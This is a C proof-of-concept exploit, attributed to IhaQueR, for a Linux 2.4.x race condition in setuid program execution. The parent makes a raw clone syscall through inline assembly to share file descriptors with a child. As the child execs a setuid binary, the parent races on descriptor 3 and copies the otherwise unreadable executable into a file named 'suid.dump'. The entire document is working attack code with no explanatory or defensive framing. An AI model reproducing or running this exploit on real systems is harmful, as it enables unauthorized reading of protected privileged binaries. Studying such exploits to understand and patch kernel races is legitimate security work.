/****************************************************************
*								*
*	Linux 2.4.x suid exec/file read race proof of concept	*
*	by IhaQueR						*
*								*
****************************************************************/



#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <fcntl.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/stat.h>

#include <asm/page.h>



void fatal(const char *msg)
{
    printf("\n");
    if (!errno) {
	fprintf(stderr, "FATAL: %s\n", msg);
    } else {
	perror(msg);
    }

    printf("\n");
    fflush(stdout);
    fflush(stderr);
    exit(129);
}


int child(char **av)
{
    int fd;

    printf("\nChild running pid %d", getpid());
    fflush(stdout);
    usleep(100000);

    execvp(av[0], av + 1);

    printf("\nFatal child exit\n");
    fflush(stdout);
    exit(0);
}


void exitus(int v)
{
    printf("\nParent terminating (child exited)\n\n");
    fflush(stdout);
    exit(129);
}

void usage(const char *name)
{
    printf("\nSuid exec dumper by IhaQueR\n");
    printf("\nUSAGE:\t%s executable [args...]", name);
    printf("\n\n");
    fflush(stdout);
    exit(0);
}


int main(int ac, char **av)
{
    int p = 0, fd = 0;
    struct stat st, st2;

    if (ac < 2)
	usage(av[0]);

    av[0] = (char *) strdup(av[1]);
    av[1] = (char *) basename(av[1]);

    p = stat(av[0], &st2);
    if (p)
	fatal("stat");

    signal(SIGCHLD, &exitus);
    printf("\nParent running pid %d", getpid());
    fflush(stdout);

    __asm__ (
             "pusha              \n"
             "movl $0x411, %%ebx \n"
             "movl %%esp, %%ecx  \n"
             "movl $120, %%eax   \n"
             "int  $0x80         \n"
             "movl %%eax, %0     \n"
             "popa"
             : : "m"(p)
            );

    if (p < 0)
	fatal("clone");

    if (!p)
	child(av);

    printf("\nParent stat loop");
    fflush(stdout);
    while (1) {
	p = fstat(3, &st);
	if (!p) {
	    if (st.st_ino != st2.st_ino)
		fatal("opened wrong file!");

	    p = lseek(3, 0, SEEK_SET);
	    if (p == (off_t) - 1)
		fatal("lseek");
	    fd = open("suid.dump", O_RDWR | O_CREAT | O_TRUNC | O_EXCL,
		      0755);
	    if (fd < 0)
		fatal("open");
	    while (1) {
		char buf[8 * PAGE_SIZE];

		p = read(3, buf, sizeof(buf));
		if (p <= 0)
		    break;
		write(fd, buf, p);
	    }
	    printf("\nParent success stating:");
	    fflush(stdout);
	    printf("\nuid %d gid %d mode %.5o inode %u size %u",
		   st.st_uid, st.st_gid, st.st_mode, st.st_ino,
		   st.st_size);
	    fflush(stdout);
	    printf("\n");
	    fflush(stdout);
	    exit(1);
	}
    }

    printf("\n\n");
    fflush(stdout);

    return 0;
}

